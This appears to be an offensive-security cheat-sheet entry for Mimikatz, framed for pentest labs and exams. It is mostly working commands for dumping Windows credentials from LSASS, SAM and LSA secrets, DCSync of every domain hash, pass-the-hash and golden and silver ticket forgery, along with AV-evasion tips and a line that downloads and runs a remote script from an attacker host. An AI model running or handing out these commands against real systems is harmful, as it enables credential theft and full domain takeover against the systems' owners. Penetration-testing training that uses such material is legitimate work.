title: Mimikatz — Credential Extraction Toolkit
body:
Mimikatz is the Swiss Army knife for Windows credentials. It reads LSASS memory, the SAM, the LSA secrets, the DPAPI vault, and Kerberos tickets — then either dumps them or weaponizes them (forge tickets, pass-the-hash, etc.). Anything involving a Windows credential probably has a Mimikatz module.

It requires local Administrator on the target (most operations need SeDebugPrivilege to read other processes' memory). For DCSync specifically, you don't need to be on the DC — you need replication rights on the *domain*, which usually means Domain Admin or equivalent.

Because it's the most-detected hacking tool in existence, running mimikatz.exe straight from disk on any modern AV-protected box will fail. In a lab/exam context where AV may be lenient or off, you can drop the binary directly. In a real engagement, you reach for in-memory loaders, LSASS dumping with built-in tools (Task Manager, comsvcs.dll), or a renamed/obfuscated build.

— PICK YOUR APPROACH BY SCENARIO —

  Lab box, no AV:           drop mimikatz.exe, run it directly
  Lab box with AV:          dump LSASS with comsvcs.dll, parse with pypykatz on Kali
  Need stealth in-memory:   Invoke-Mimikatz from PowerShell (also widely signatured)
  Linux only / no Windows:  impacket-secretsdump for DCSync, pypykatz for LSASS minidumps

— THE FOUR MODULES YOU'LL ACTUALLY USE —

  privilege::debug          Enable SeDebugPrivilege (always run first)
  sekurlsa::*               Read LSASS — logged-on users' hashes and tickets
  lsadump::*                Read SAM, LSA secrets, perform DCSync
  kerberos::*               Forge and manipulate tickets (silver/golden)

Everything else (crypto::, ts::, misc::) is situational.
cmd:
# ══════════════════════════════════════════════════
# ALWAYS START HERE
# ══════════════════════════════════════════════════
# Run from an elevated (Admin) PowerShell or cmd prompt
.\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK                              # if not OK: you're not Admin

# Optional — log everything to a file:
mimikatz # log mimikatz_run.txt

# ══════════════════════════════════════════════════
# SEKURLSA — DUMP LIVE CREDENTIALS FROM LSASS
# ══════════════════════════════════════════════════

# The big one — every logged-on user's hashes, tickets, and (if WDigest is on) plaintext:
mimikatz # sekurlsa::logonpasswords

# Just the Kerberos tickets in memory:
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::tickets /export             # dump each ticket as a .kirbi file

# Just NTLM hashes (terser output):
mimikatz # sekurlsa::msv

# AES keys (modern domains may reject RC4 — pull AES256 from same memory region):
mimikatz # sekurlsa::ekeys

# Escalate Admin → SYSTEM without psexec:
mimikatz # token::elevate

# Pass-the-Hash — spawn a process as another user using their NTLM hash:
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:HASH /run:powershell.exe

# Overpass-the-Hash — convert NTLM to Kerberos TGT (see mimikatz_advanced):
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /aes256:KEY /run:powershell.exe

# Pass-the-Ticket — load a previously exported .kirbi:
mimikatz # kerberos::ptt c:\tickets\Administrator.kirbi

# ══════════════════════════════════════════════════
# LSADUMP — SAM, LSA SECRETS, DCSYNC
# ══════════════════════════════════════════════════

# Local SAM (local accounts on the box):
mimikatz # lsadump::sam

# LSA secrets (cached domain logons, service account passwords):
mimikatz # lsadump::secrets

# Cached domain credentials (MSCASH/MSCACHEv2 — cracked offline):
mimikatz # lsadump::cache

# DCSync — pull a single user's hash from the DC via replication:
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt              # for golden tickets

# Dump every user in the domain:
mimikatz # lsadump::dcsync /domain:corp.com /all /csv

# ══════════════════════════════════════════════════
# KERBEROS — FORGE TICKETS (see silver_tickets node)
# ══════════════════════════════════════════════════

# Silver ticket (for one SPN, needs that SPN's hash):
mimikatz # kerberos::golden /sid:DOMAIN-SID /domain:corp.com \
    /target:web04.corp.com /service:cifs /rc4:SPN_HASH \
    /user:fakeadmin /ptt

# Golden ticket (any user, any service — needs krbtgt hash from DCSync):
mimikatz # kerberos::golden /sid:DOMAIN-SID /domain:corp.com \
    /krbtgt:KRBTGT_HASH /user:fakeadmin /ptt

# List currently cached tickets:
mimikatz # kerberos::list

# Purge tickets (clean up after PTT):
mimikatz # kerberos::purge

# ══════════════════════════════════════════════════
# RUNNING WITHOUT TOUCHING DISK
# ══════════════════════════════════════════════════

# Method 1 — LSASS dump with built-in tools, parse on Kali
# On target (Admin cmd or PowerShell):
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
# Get the PID:
tasklist /svc | findstr lsass
# Or:
Get-Process lsass | select id

# Exfil lsass.dmp to Kali, then:
pypykatz lsa minidump lsass.dmp
# Output is fully Mimikatz-equivalent: hashes, tickets, plaintext if WDigest was on

# Method 2 — Task Manager dump (GUI, no command-line audit trail)
# Open Task Manager as Admin → Details → right-click lsass.exe → Create dump file

# Method 3 — Invoke-Mimikatz (PowerSploit, widely flagged but works on lab boxes)
IEX (New-Object Net.WebClient).DownloadString('http://$lhost/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'

# ══════════════════════════════════════════════════
# FROM KALI WITHOUT MIMIKATZ AT ALL
# ══════════════════════════════════════════════════

# DCSync (needs DA-equivalent creds):
impacket-secretsdump corp.com/jeffadmin:'Pass'@$dc_ip
impacket-secretsdump -just-dc-user Administrator corp.com/jeffadmin:'Pass'@$dc_ip
impacket-secretsdump -hashes :NTHASH corp.com/jeffadmin@$dc_ip          # PTH version

# Local SAM dump from a remote host (needs local admin):
impacket-secretsdump corp.com/admin:'Pass'@$ip                          # also pulls LSA + cached

# Parse a dumped LSASS minidump:
pypykatz lsa minidump lsass.dmp

# Forge tickets without Mimikatz:
impacket-ticketer -nthash HASH -domain-sid SID -domain corp.com -spn SPN username

# ══════════════════════════════════════════════════
# COMMON FAILURE MODES
# ══════════════════════════════════════════════════

# 'Privilege '20' KO':
#   Not running as Admin. UAC may also be blocking — re-launch with 'Run as Administrator'.
#
# Empty sekurlsa::logonpasswords output:
#   LSA Protection is enabled (RunAsPPL). Mimikatz can bypass it with !mimidrv,
#   but you need a driver load — usually easier to dump LSASS and parse offline.
#
# Plaintext password is '(null)' for everyone:
#   WDigest is disabled (default on Windows 8.1+ / 2012 R2+).
#   You'll get NTLM hashes, just not cleartext. Crack the hashes or use PTH.
#
# DCSync 'RPC server unavailable':
#   Wrong hostname/IP for DC, or you don't have replication rights.
#   Verify with: Get-ADUser jeffadmin -Properties memberof | select -expand memberof
#
# AV killed mimikatz.exe on disk:
#   Switch to comsvcs.dll method above, or rename the binary and try again.
#   For exam purposes, a rename + UPX pack often suffices on lab AV.
warn: Mimikatz writes to LSASS and reads protected memory. Stable, but a buggy module on a real production DC can cause LSASS to crash → host reboot. On engagements, prefer offline parsing (dump → pypykatz) over live module execution. On exam labs, just go.

choices.label: Got NTLM hash — pass-the-hash to lateral move
Advanced: OPTH, WDigest plaintext, on-DC dump, Invoke-Mimikatz
Got SPN hash — forge silver tickets
Got DPAPI master key — decrypt user vault
Capture FUTURE logons (not just current) — SSP injection
